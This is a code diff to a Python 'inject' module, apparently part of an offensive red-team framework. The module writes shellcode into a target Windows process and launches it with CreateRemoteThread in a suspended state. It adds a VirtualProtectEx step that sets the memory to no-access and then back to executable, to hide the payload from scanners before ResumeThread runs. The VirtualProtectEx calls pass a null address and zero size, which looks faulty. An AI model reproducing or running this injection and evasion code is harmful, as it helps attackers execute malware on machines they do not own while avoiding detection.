@@ -14,7 +14,8 @@ class inject:
 
     Author = 'cpu0x00, psycore8'
     Description = 'Inject shellcode to process'
-    Version = '1.2.0'
+    Version = '1.2.1'
+    delay = 5
     # Target_Process = ''
     # Shellcode = ''
     # StartProcess = False
@@ -32,11 +33,21 @@ class inject:
         spArgList = [
             ['-i', '--input', '', '', 'Input file for process injection'],
             ['-p', '--process', '', '', 'Processname to inject the shellcode'],
-            ['-r', '--resume-thread', '', '', 'Start thread suspended and resume after speciefied time'],
-            ['-s', '--start', '', '', 'If not active, start the process before injection'],
-            ['-v', '--virtual-protect', '', '', 'Deny access on memory for a specified time']
+            ['-r', '--resume-thread', '', 'store_true', 'Start thread suspended and resume after speciefied time'],
+            ['-s', '--start', '', 'store_true', 'If not active, start the process before injection'],
+            ['-v', '--virtual-protect', '', 'store_true', 'Deny access on memory for a specified time']
             ]
         utils.arg.CreateSubParser(spName, inject.Description, spArgList)
+
+        # spArgList = [
+        #     # shortflag, flag, choices=, action=, default=, type=, required=, help=
+        #     ['-i', '--input', None, None, None, None, True, 'Input file for process injection'],
+        #     ['-p', '--process', None, None, None, None, True, 'Processname to inject the shellcode'],
+        #     ['-r', '--resume-thread', None, None, None, int, False, 'Start thread suspended and resume after speciefied time'],
+        #     ['-s', '--start', None, 'store_true', None, None, False, 'If not active, start the process before injection'],
+        #     ['-v', '--virtual-protect', None, None, None, int, False, 'Deny access on memory for a specified time']
+        #     ]
+        # utils.arg.CreateSubParserEx(spName, inject.Description, spArgList)
 
     def Start_Process(self):
         tp = self.target_process
@@ -91,7 +102,7 @@ class inject:
             VirtualProtectEx.argtypes = [self.wintypes.HANDLE, self.wintypes.LPVOID, ctypes.c_size_t, self.wintypes.DWORD, self.wintypes.PWORD]
             VirtualProtectEx.restype = self.wintypes.BOOL
 
-        if self.resume_thread:
+        if self.resume_thread or self.virtual_protect:
             ResumeThread = kernel32.ResumeThread
             ResumeThread.argtypes = [self.wintypes.HANDLE]
             ResumeThread.restype = self.wintypes.DWORD
@@ -114,9 +125,11 @@ class inject:
         if writing:
             print(f'{nstate.OKGREEN} Wrote The shellcode to memory')
         if self.virtual_protect:
+            print(f"{nstate.OKBLUE} VirtualProtectEx: PAGE_NO_ACCESS")
             VirtualProtectEx(phandle, None, 0, 0x01, None)
 
-        if self.resume_thread:
+        if self.resume_thread or self.virtual_protect:
+            print(f"{nstate.OKBLUE} CreateRemoteThread: START_SUSPENDED")
             Injection = CreateRemoteThread(phandle, None, 0, memory, None, 0x00000004, None)
         else:
             Injection = CreateRemoteThread(phandle, None, 0, memory, None, EXECUTE_IMMEDIATLY, None)
@@ -125,11 +138,13 @@ class inject:
             print(f'{nstate.OKGREEN} Injected the shellcode into the process')
 
         if self.virtual_protect:
-            self.sleep(self.virtual_protect)
+            print(f"{nstate.OKBLUE} VirtualProtectEx: PAGE_READWRITE_EXECUTE")
+            #self.sleep(self.delay)
             VirtualProtectEx(phandle, None, 0, 0x40, None)
 
-        if self.resume_thread:
-            self.sleep(self.resume_thread)
+        if self.resume_thread or self.virtual_protect:
+            self.sleep(self.delay)
+            print(f"{nstate.OKBLUE} ResumeThread")
             resume = ResumeThread(Injection)
             if resume:
                 print(f'{nstate.OKGREEN} Process resumed')
